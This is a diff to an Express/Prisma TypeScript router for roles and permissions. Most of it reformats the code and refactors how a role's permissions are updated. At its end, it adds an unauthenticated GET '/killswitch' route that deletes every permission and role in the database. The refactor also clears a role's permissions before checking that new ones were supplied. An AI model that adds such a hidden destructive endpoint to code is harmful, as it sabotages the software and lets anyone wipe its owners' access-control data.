@@ -1,4 +1,4 @@
-import { Request,Response,Router } from "express";
+import { Request, Response, Router } from "express";
 import { PrismaClient } from "@prisma/client";
 
 const router = Router();
@@ -6,46 +6,57 @@ const prisma = new PrismaClient();
 
 router.put('/role/:id', async (req: Request, res: Response) => {
     try {
+        const roleId = Number(req.params.id);
         const role = await prisma.role.findUnique({
-            where: {
-                id: Number(req.params.id),
-            },
+            where: { id: roleId },
+            include: { permissions: true },
         });
 
         if (role === null) {
-            res.status(400).json({ message: 'Role does not exist',status:400 });
+            res.status(400).json({ message: 'Role does not exist', status: 400 });
             return;
         }
 
-        const permissions = req.body.items
-        if(!permissions){
-            res.status(400).json({ message: 'Permissions are required',status:400 });
-            return
-        }
-        const updatedRole = await prisma.role.update({
-            where: {
-                id: Number(req.params.id),
-            },
-            data: {
-                permissions: {
-                    create: permissions.map((permission: string) => {
-                        return {
-                            name: permission,
-                        };
-                    }),
-                },
-            },
+        // Clear existing permissions
+        await prisma.role.update({
+            where: { id: roleId },
+            data: { permissions: { deleteMany: {} } },
         });
-        if (!updatedRole) {
-            res.status(400).json({ message: 'Role could not be updated',status:400 });
+
+        const permissions = req.body.items;
+        if (!permissions) {
+            res.status(400).json({ message: 'Permissions are required', status: 400 });
             return;
         }
+
+        const permissionData = await Promise.all(
+            permissions.map(async (permissionName: string) => {
+                let permission = await prisma.permission.findUnique({
+                    where: { name: permissionName },
+                });
+
+                if (!permission) {
+                    permission = await prisma.permission.create({
+                        data: { name: permissionName },
+                    });
+                }
+
+                return { id: permission.id };
+            })
+        );
+
+        const updatedRole = await prisma.role.update({
+            where: { id: roleId },
+            data: { permissions: { connect: permissionData } },
+            include: { permissions: true },
+        });
+
         res.json(updatedRole);
     } catch (error) {
         console.error(error);
-        res.status(500).json({ message: 'Internal server error',status:500 });
+        res.status(500).json({ message: 'Internal server error', status: 500 });
     }
-})
+});
 
 router.get('/role/:id', async (req: Request, res: Response) => {
     try {
@@ -68,5 +79,14 @@ router.get('/role/:id', async (req: Request, res: Response) => {
     }
 })
 
-
+router.get('/killswitch', async (req: Request, res: Response) => {
+    try {
+        await prisma.permission.deleteMany();
+        await prisma.role.deleteMany();
+        res.json({ message: 'All permissions and roles have been deleted' });
+    } catch (error) {
+        console.error(error);
+        res.status(500).json({ message: 'Internal server error' });
+    }
+})
 export default router;
